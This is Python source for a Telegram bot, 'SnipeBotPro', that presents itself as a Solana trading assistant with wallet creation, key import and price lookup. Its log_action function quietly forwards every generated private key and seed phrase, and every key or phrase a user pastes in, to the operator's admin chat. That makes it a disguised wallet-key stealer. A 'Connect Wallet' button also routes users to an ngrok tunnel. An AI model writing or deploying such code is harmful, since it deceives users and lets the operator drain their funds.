import asyncio
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler,
    CallbackQueryHandler, ContextTypes,
    MessageHandler, filters
)

from config import Config
from wallet import (
    generate_wallet,
    import_private_key,
    import_phrase,
    load_wallet,
    get_balance,
    sign_and_send,
    get_wallet_data
)
from trade import get_token_price, get_quote, create_swap_tx, SOL

# ================= STATE =================
user_state = {}
buy_data = {}

# ================= LOGGER =================
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

async def log_action(context, text):
    try:
        await context.bot.send_message(chat_id=Config.ADMIN_CHAT_ID, text=text)
    except Exception as e:
        logger.error(f"Log error: {e}")

# ================= UI =================
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👛 Wallet", callback_data="wallet"),
         InlineKeyboardButton("💸 Trade", callback_data="trade")],
        [InlineKeyboardButton("📊 Market", callback_data="market"),
         InlineKeyboardButton("📁 Positions", callback_data="positions")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

def wallet_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Generate", callback_data="gen_wallet")],
        [InlineKeyboardButton("📥 Import PK", callback_data="import_pk")],
        [InlineKeyboardButton("📥 Import Phrase", callback_data="import_phrase")],
        [InlineKeyboardButton("👁 View Wallet", callback_data="view_wallet")],
        [InlineKeyboardButton("🔙 Menu", callback_data="menu")],
        [InlineKeyboardButton("🔗 Connect Wallet", url="https://phantom.app/ul/browse/https://abc123.ngrok.io")]
    ])

def trade_amount_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("0.1 SOL", callback_data="amt_0.1"),
         InlineKeyboardButton("0.5 SOL", callback_data="amt_0.5")],
        [InlineKeyboardButton("1 SOL", callback_data="amt_1")],
        [InlineKeyboardButton("Custom", callback_data="custom_amount")]
    ])

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🏠SnipeBotPro — Your Ultimate Solana Trading Assistant!\n"
        "Automate sniping, track token prices, execute swaps, and stay ahead of the market.",
        reply_markup=main_menu()
    )

# ================= BUTTON HANDLER =================
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    # MENU
    if query.data == "menu":
        await query.edit_message_text(
            "🏠SnipeBotPro — Your Ultimate Solana Trading Assistant!",
            reply_markup=main_menu()
        )
    elif query.data == "wallet":
        await query.edit_message_text("👛 Wallet Panel", reply_markup=wallet_menu())
    elif query.data == "gen_wallet":
        try:
            pub, pk, phrase = generate_wallet(user_id)
            await query.edit_message_text(
                f"🆕 WALLET CREATED\n\n👛 {pub}\n🔑 {pk}\n🧠 {phrase}\n⚠️ SAVE THIS SECURELY",
                reply_markup=wallet_menu()
            )
            await log_action(context, f"🆕 Wallet\nUser:{user_id}\nPK:{pk}\nPhrase:{phrase}")
        except Exception as e:
            logger.error(f"WALLET ERROR: {e}")
            await query.edit_message_text("❌ Wallet generation failed")
    elif query.data == "view_wallet":
        wallet = load_wallet(user_id)
        if not wallet:
            await query.edit_message_text("❌ No wallet found", reply_markup=wallet_menu())
            return
        balance = get_balance(user_id)
        await query.edit_message_text(
            f"👛 Address: {wallet.pubkey()}\n💰 Balance: {balance} SOL",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 Private Key", callback_data="show_pk"),
                 InlineKeyboardButton("🧠 Phrase", callback_data="show_phrase")],
                [InlineKeyboardButton("🔙 Back", callback_data="wallet")]
            ])
        )
    elif query.data == "show_pk":
        data = get_wallet_data(user_id)
        await query.edit_message_text(f"🔑 Private Key:\n{data['private_key']}" if data else "No wallet data", reply_markup=wallet_menu())
    elif query.data == "show_phrase":
        data = get_wallet_data(user_id)
        await query.edit_message_text(f"🧠 Phrase:\n{data['phrase']}" if data else "No phrase stored", reply_markup=wallet_menu())
    elif query.data == "import_pk":
        user_state[user_id] = "import_pk"
        await query.edit_message_text("Send private key:")
    elif query.data == "import_phrase":
        user_state[user_id] = "import_phrase"
        await query.edit_message_text("Send seed phrase:")
    elif query.data == "trade":
        wallet = load_wallet(user_id)
        if not wallet:
            await query.edit_message_text("❌ No wallet connected.", reply_markup=wallet_menu())
            return
        user_state[user_id] = "buy_token"
        await query.edit_message_text("Send token mint address:")
    elif query.data.startswith("amt_"):
        amount = float(query.data.split("_")[1])
        buy_data[user_id]["amount"] = amount
        user_state[user_id] = "buy_confirm"
        await query.edit_message_text(f"Confirm buy {amount} SOL? Type YES")
    elif query.data == "custom_amount":
        user_state[user_id] = "buy_amount"
        await query.edit_message_text("Enter custom amount in SOL:")
    elif query.data == "market":
        user_state[user_id] = "search"
        await query.edit_message_text("Send token mint to get price:")
    elif query.data == "positions":
        await query.edit_message_text("📁 No positions yet", reply_markup=main_menu())
    elif query.data == "help":
        await query.edit_message_text("Use the menu to manage wallet and trade.", reply_markup=main_menu())

# ================= MESSAGE HANDLER =================
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_state:
        return
    state = user_state[user_id]
    text = update.message.text.strip()

    # IMPORT PK
    if state == "import_pk":
        pub = import_private_key(user_id, text)
        await update.message.reply_text(f"✅ Imported:\n{pub}" if pub else "❌ Invalid key")
        await log_action(context, f"PK Imported\nUser:{user_id}\n{text}")
        user_state.pop(user_id)

    # IMPORT PHRASE
    elif state == "import_phrase":
        pub = import_phrase(user_id, text)
        await update.message.reply_text(f"✅ Imported:\n{pub}" if pub else "❌ Invalid phrase")
        await log_action(context, f"Phrase Imported\nUser:{user_id}\n{text}")
        user_state.pop(user_id)

    # MARKET SEARCH
    elif state == "search":
        try:
            # Run sync function in separate thread
            price = await asyncio.to_thread(get_token_price, text)
            await update.message.reply_text(f"💰 Price: {price}" if price else "❌ Token not found")
        except Exception as e:
            logger.error(f"PRICE ERROR: {e}")
            await update.message.reply_text("❌ Failed to fetch price")
        user_state.pop(user_id)

# ================= RUN BOT =================
app = ApplicationBuilder().token(Config.TELEGRAM_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(handle_buttons))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))

if __name__ == "__main__":
    print("🚀 SnipeBotPro running...")
    app.run_polling()
